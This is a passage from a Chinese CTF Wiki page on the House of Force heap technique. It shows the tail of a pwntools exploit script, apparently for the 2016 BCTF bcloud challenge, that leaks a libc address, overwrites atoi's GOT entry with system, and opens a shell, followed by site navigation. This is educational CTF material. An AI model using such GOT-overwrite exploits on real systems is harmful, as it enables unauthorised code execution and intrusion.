    <span class="n">libc_base</span> <span class="o">=</span> <span class="n">atoi_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;atoi&#39;</span><span class="p">]</span>
    <span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;libc base addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>

    <span class="c1"># overwrite atoi@got with system</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;option---&gt;&gt;&#39;</span><span class="p">,</span> <span class="s1">&#39;3&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Input the id:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Input the new content:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>

    <span class="c1"># get shell</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;option---&gt;&gt;&#39;</span><span class="p">,</span> <span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="n">exp</span><span class="p">()</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="id12">
<h2>题目<a class="headerlink" href="#id12" title="永久链接至标题">¶</a></h2>
<ul class="simple">
<li><a class="reference external" href="https://github.com/ctfs/write-ups-2016/tree/master/boston-key-party-2016/pwn/cookbook-6">2016 Boston Key Party CTF cookbook</a></li>
</ul>
</div>
</div>


          </div>
        </div>
      </div>
      <div class="sphinxsidebar" role="navigation" aria-label="main navigation">
        <div class="sphinxsidebarwrapper">
<div id="searchbox" style="display: none" role="search">
  <h3>快速搜索</h3>
    <form class="search" action="../../search.html" method="get">
      <div><input type="text" name="q" /></div>
      <div><input type="submit" value="转向" /></div>
      <input type="hidden" name="check_keywords" value="yes" />
      <input type="hidden" name="area" value="default" />
    </form>
</div>
<script type="text/javascript">$('#searchbox').show(0);</script>
<div class="sphinx-toc sphinxglobaltoc">
<h3><a href="../../index.html">內容目录</a></h3>
<p class="caption"><span class="caption-text">CTF 介绍</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../../introduction/history.html">CTF 竞赛的历史</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../introduction/mode.html">CTF 竞赛模式简介</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../introduction/content.html">CTF 竞赛内容</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../introduction/experience.html">线下攻防经验小结</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../introduction/cgc.html">CGC 网络超级挑战赛</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../introduction/resources.html">学习资源</a></li>
</ul>
<p class="caption"><span class="caption-text">Misc</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../../misc/about.html">杂项简介</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../misc/recon.html">信息搜集技术</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../misc/encode/index.html">编码分析</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../misc/prefix.html">取证隐写</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../misc/picture/index.html">图片分析</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../misc/traffic/index.html">流量包分析</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../misc/archive/index.html">压缩包分析</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../misc/audio/index.html">音频分析</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../misc/disk_memory/index.html">磁盘 / 内存分析</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../misc/others.html">其他</a></li>
</ul>
<p class="caption"><span class="caption-text">Crypto</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../../crypto/introduction.html">密码学简介</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../crypto/classical/index.html">古典密码</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../crypto/symmetric/index.html">对称加密</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../crypto/asymmetric/index.html">非对称密码</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../crypto/hash/index.html">哈希函数</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../crypto/signature/index.html">数字签名</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../crypto/others/others.html">证书格式</a></li>
</ul>
<p class="caption"><span class="caption-text">Web</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../../web/index.html">WEB 简介</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../web/sqli.html">SQL 注入</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../web/xss.html">XSS 跨站脚本攻击</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../web/csrf.html">CSRF 跨站请求伪造</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../web/ssrf.html">SSRF 服务端请求伪造</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../web/php.html">PHP 代码审计</a></li>
</ul>
<p class="caption"><span class="caption-text">Reverse</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../../reverse/introduction.html">软件逆向工程简介</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../reverse/unpack/index.html">Unpack Tricks</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../reverse/unicorn/index.html">Unicorn Engine</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../reverse/anti_debug/index.html">Anti Debug Tech</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../reverse/linux/index.html">Linux RE</a></li>
</ul>
<p class="caption"><span class="caption-text">Pwn</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="../stackoverflow/index.html">栈溢出</a></li>
<li class="toctree-l1"><a class="reference internal" href="../fmtstr/index.html">格式化字符串漏洞</a></li>
<li class="toctree-l1 current"><a class="reference internal" href="index.html">堆利用</a><ul class="current">
<li class="toctree-l2"><a class="reference internal" href="heap_overview.html">堆概述</a></li>
<li class="toctree-l2"><a class="reference internal" href="heap_structure.html">堆相关数据结构</a></li>
<li class="toctree-l2"><a class="reference internal" href="heap_implementation_details.html">深入理解堆的实现</a></li>
<li class="toctree-l2"><a class="reference internal" href="heapoverflow_basic.html">堆溢出</a></li>
<li class="toctree-l2"><a class="reference internal" href="off_by_one.html">堆中的 Off-By-One</a></li>
<li class="toctree-l2"><a class="reference internal" href="unlink.html">Unlink</a></li>
<li class="toctree-l2"><a class="reference internal" href="use_after_free.html">Use After Free</a></li>
<li class="toctree-l2"><a class="reference internal" href="fastbin_attack.html">Fastbin Attack</a></li>
<li class="toctree-l2"><a class="reference internal" href="chunk_extend_shrink.html">Chunk Extend/Shrink</a></li>
<li class="toctree-l2"><a class="reference internal" href="house_of_einherjar.html">House Of Einherjar</a></li>
<li class="toctree-l2"><a class="reference internal" href="house_of_lore.html">House of Lore</a></li>
<li class="toctree-l2 current"><a class="current reference internal" href="#">House Of Force</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id1">介绍</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id2">原理</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id3">简单示例1</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id4">简单示例2</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id5">小总结</a></li>
<li class="toctree-l3"><a class="reference internal" href="#hitcon-training-lab-11">HITCON training lab 11</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#id6">基本信息</a></li>
<li class="toctree-l4"><a class="reference internal" href="#id7">基本功能</a></li>
<li class="toctree-l4"><a class="reference internal" href="#id8">利用</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#bctf-bcloud">2016 BCTF bcloud</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#id9">基本信息</a></li>
<li class="toctree-l4"><a class="reference internal" href="#id10">基本功能</a></li>
<li class="toctree-l4"><a class="reference internal" href="#id11">利用</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#id12">题目</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="unsorted_bin_attack.html">Unsorted Bin Attack</a></li>
</ul>
</li>
</ul>
<p class="caption"><span class="caption-text">Executable</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../../executable/elf/index.html">ELF文件</a></li>
</ul>
</div>
        </div>
      </div>
    
    
        <div class="sidebar-toggle-group no-js">
            
            <button class="sidebar-toggle" id="sidebar-hide" title="Hide the sidebar menu">
                 «
                <span class="show-for-small">hide menu</span>
                
            </button>
            <button class="sidebar-toggle" id="sidebar-show" title="Show the sidebar menu">
                
                <span class="show-for-small">menu</span>
                <span class="hide-for-small">sidebar</span>
                 »
            </button>
        </div>
    
      <div class="clearer"></div>
    </div>
    <div class="relbar-bottom">
        
    <div class="related" role="navigation" aria-label="related navigation">
      <h3>导航</h3>
      <ul>
        <li class="right" style="margin-right: 10px">
          <a href="../../index.html" title="內容目录"
             >toc</a></li>
        <li class="right" >
          <a href="unsorted_bin_attack.html" title="Unsorted Bin Attack"
             >下一页</a> &nbsp; &nbsp;</li>
        <li class="right" >
          <a href="house_of_lore.html" title="House of Lore"
             >上一页</a> &nbsp; &nbsp;</li>
    <li><a href="../../index.html">CTF Wiki </a> &#187;</li>

          <li class="nav-item nav-item-1"><a href="index.html" >堆利用</a> &#187;</li> 
      </ul>
    </div>
    </div>

    <div class="footer" role="contentinfo">
        &#169; Copyright 2016-2017, CTF Wiki.
      由 <a href="http://sphinx-doc.org/">Sphinx</a> 1.6.7 创建。
    </div>
    <!-- cloud_sptheme 1.4 -->
  </body>
</html>